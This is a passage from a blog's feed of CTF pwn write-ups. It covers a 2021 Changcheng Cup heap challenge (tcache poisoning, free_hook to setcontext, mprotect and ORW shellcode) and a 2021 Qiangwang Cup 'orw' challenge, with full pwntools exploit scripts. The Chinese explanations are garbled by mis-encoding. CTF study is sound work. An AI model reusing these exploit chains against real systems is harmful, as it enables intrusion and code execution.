class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#æ³„éœ²libcåŸºå€</span><br>edit(<span class="hljs-number">5</span>, payload)<br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922165259157.png" alt="image-20210922165259157"></p><p>å¾€free_hooké‡Œé¢å†™å…¥setcontext+53çš„åœ°å€</p><p>ç„¶åæ ¹æ®<code>setcontext+53</code>ä¸Šçš„å¯„å­˜å™¨å¸ƒç½®ç¯å¢ƒï¼šè€Œrdiçš„å€¼æ˜¯æˆ‘ä»¬ç­‰ä¸‹è¦é‡Šæ”¾çš„å †å—çš„åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªè®¡ç®—å‡ºåç§»ï¼Œåœ¨å¯¹åº”çš„åœ°å€ä¸ºrdiï¼Œrsiï¼Œrdxè®¾ç½®å‚æ•°ï¼Œç„¶åè®¾ç½®rcxçš„å€¼ä¸ºmprotectçš„åœ°å€ï¼Œå»æ‰§è¡Œmprotectï¼Œå†è·³è½¬å›æ¥æ‰§è¡Œshellcodeè¯»å–flag</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922170913920.png" alt="image-20210922170913920"></p><p>æˆåŠŸè¯»å–flagï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;47.104.175.110&quot;,61608)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;input size:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;input context:\n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+ <span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap = leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr = leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+ <span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(<span class="hljs-number">5</span>, payload)<br><br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base+libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#shellcode</span><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p>ä»¥åå­¦åˆ°äº†ï¼Œå†å›æ¥å¤ç°ï¼ˆå¯èƒ½æ˜¯è¿‘æœŸ å§ï¼Œè¿‘æœŸå†³å®šçˆ†è‚å­¦ä¹ ï¼Œå¸Œæœ›èƒ½ï¼‰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™æ¬¡ä¸€å…±ä¸‰é¢˜pwnï¼Œä¸¤é¢˜å…¶å®éƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„å †é¢˜ï¼Œå¯æƒœåªåšå‡ºäº†ä¸€é¢˜ï¼Œè¿˜æœ‰ä¸€é¢˜å †ä¸Šçš„orwåœ¨æ¯”èµ›å‰æ²¡èƒ½å‡º ã€‚ä¸è¿‡æ€»çš„æ¥è¯´ï¼šæ¯”ä¹‹å‰è¿˜æ˜¯è¿›æ­¥äº†å¾ˆå¤šï¼Œ</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ptmalloc--ç¬”è®°</title>
    <link href="http://example.com/2021/09/17/2021-09-17-ptmalloc-%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/09/17/2021-09-17-ptmalloc-%E7%AC%94%E8%AE%B0/</id>
    <published>2021-09-17T13:02:21.000Z</published>
    <updated>2021-10-13T08:01:24.335Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¯¥ç¯‡åšå®¢æ˜¯å­¦ä¹ ã€Šglibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æ@ååº­ã€‹æ—¶ï¼Œè¾¹å­¦è¾¹è®°å½•çš„ä¸€äº›é›¶æ•£çŸ¥è¯†ç‚¹ï¼Œä»¥åŠå¯èƒ½ä¼šæœ‰çš„ä¸€äº›ç²—æµ…çš„ä¸ªäººè§è§£ï¼Œæˆ–è€…å› æŸäº›çŸ¥è¯†äº§ç”Ÿçš„é—®é¢˜ä¸æ€è€ƒ</p><h2 id="ç¬”è®°"><a href="#ç¬”è®°" class="headerlink" title="ç¬”è®°"></a>ç¬”è®°</h2><p>1ã€</p><h2 id="ä¸ªäººé—®é¢˜ä¸ä¸ªäººè§£ç­”"><a href="#ä¸ªäººé—®é¢˜ä¸ä¸ªäººè§£ç­”" class="headerlink" title="ä¸ªäººé—®é¢˜ä¸ä¸ªäººè§£ç­”"></a>ä¸ªäººé—®é¢˜ä¸ä¸ªäººè§£ç­”</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¯¥ç¯‡åšå®¢æ˜¯å­¦ä¹ ã€Šglibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æ@ååº­ã€‹æ—¶ï¼Œè¾¹å­¦è¾¹è®°å½•çš„ä¸€äº›é›¶æ•£çŸ¥è¯†ç‚¹ï¼Œä»¥åŠå¯èƒ½ä¼šæœ‰çš„ä¸€äº›ç²—æµ…çš„ä¸ªäººè§è§£ï¼Œæˆ–è€…å› </summary>
      
    
    
    
    
    <category term="ptmalloc" scheme="http://example.com/tags/ptmalloc/"/>
    
  </entry>
  
  <entry>
    <title>2021å¼ºç½‘æ¯PWN</title>
    <link href="http://example.com/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/</id>
    <published>2021-09-14T07:42:03.000Z</published>
    <updated>2021-10-13T08:01:24.335Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ç°æ¥æºï¼š</p><p><a href="https://blog.csdn.net/eeeeeight/article/details/118006138">https://blog.csdn.net/eeeeeight/article/details/118006138</a></p><p><a href="https://cloud.tencent.com/developer/article/1839670">https://cloud.tencent.com/developer/article/1839670</a></p><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914154341329.png" alt="image-20210914154341329"></p><p>checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œå †æ ˆå¯æ‰§è¡Œ</p><p>è¿›å…¥IDAï¼Œåªå­˜åœ¨ç”³è¯·å’Œé‡Šæ”¾å †å—çš„åŠŸèƒ½ï¼Œå…¶ä¸­ï¼Œç”³è¯·æœ€å¤šä¸¤æ¬¡ï¼Œé‡Šæ”¾åªæœ‰ä¸€æ¬¡ã€‚</p><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155156145.png" alt="image-20210914155156145"></p><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155132957.png" alt="image-20210914155132957"></p><p>é¦–å…ˆï¼Œæ²¡æœ‰æ£€æŸ¥ç´¢å¼•ä¸‹é™ï¼Œæ‰€ä»¥å­˜åœ¨æ•°ç»„è¶Šç•Œï¼Œå¯ä»¥è¶Šç•Œåˆ°gotè¡¨ã€‚ç„¶åè¾“å…¥å‡½æ•°ä¸­ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¾“å…¥sizeæ—¶ï¼Œç›´æ¥è¾“å…¥â€™\nâ€™ï¼Œå°†ä¼šè®©sizeç›´æ¥ä¸º0ï¼Œè€Œå¦‚æœsizeä¸º0äº†ï¼Œåœ¨å¾€å †é‡Œé¢è¾“å…¥æ•°æ®æ˜¯å°±å¯ä»¥æ— é™è¾“å…¥ï¼Œå› ä¸ºåœ¨æ£€éªŒé‚£é‡Œï¼Œbufä¸€æ—¦è·å¾—è·Ÿpträ¸€æ ·çš„åœ°å€ï¼Œè€Œbufåˆè¦å…ˆè‡ªåŠ ï¼Œæ‰å°±ä¼šå¯¼è‡´ä¸€ç›´éƒ½å°†å¤§äºptrï¼ŒéªŒè¯ä¸€ç›´éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„</p><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155508246.png" alt="image-20210914155508246"></p><p>ç¨‹åºæœ‰æ²™ç®±ï¼Œæ‰€ä»¥å°±æ˜¯orwã€‚åŠ ä¸Šå‰é¢å‘ç°çš„æ¼æ´ç‚¹ï¼Œç»“åˆèµ·æ¥å°±æ˜¯ï¼Œé€šè¿‡æ•°ç»„è¶Šç•Œï¼Œå°†å †å—æŒ‡é’ˆå†™å…¥åˆ°å‡½æ•°çš„gotè¡¨é‡Œé¢ï¼Œç„¶åå› ä¸ºæ— é™è¾“å…¥ï¼Œå †å—åˆå¯æ‰§è¡Œï¼Œæ‰€ä»¥å¾€å †å—é‡Œé¢å†™å…¥shellcodeï¼Œæœ€åå°±æ˜¯è°ƒç”¨è¢«ä¿®æ”¹å‡½æ•°ï¼Œè½¬è€Œå»æ‰§è¡Œshellcodeæ¥è¯»å–flag</p><p>ç„¶åå‘¢ï¼Œæœ¬åœ°å¤ç°ä¸äº†ï¼Œæš‚æ—¶ä¸çŸ¥é“è¯¥æ€ä¹ˆè®©æ–‡ä»¶å»é“¾æ¥ä¸Šé¢˜ç›®ç»™çš„seccompæ–‡ä»¶ï¼Œæ‰€ä»¥åªèƒ½è®²è®²æ€è·¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#sh=process(&#x27;./orw&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>libc=elf.libc<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>    shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    mov rdi, 0x67616c662f2e</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    mov rsi, rdi</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;-25&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;size:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    sh.sendline(asm(shellcode))<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        sh=process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>        sh=remote(<span class="hljs-string">&#x27;39.105.131.68&#x27;</span>,<span class="hljs-number">12354</span>)<br>   <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            sh.close()<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¤ç°æ¥æºï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/eeeeeight/article/details/118006138&quot;&gt;https://blog.csdn.net/eeeeeight/article/details/11800613</summary>
      
    
    
    
    
    <category term="å¼ºç½‘æ¯" scheme="http://example.com/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>2021ç¾ŠåŸæ¯PWN</title>
    <link href="http://example.com/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/</id>
    <published>2021-09-13T08:50:56.000Z</published>
    <updated>2021-10-13T08:01:24.288Z</updated>
    
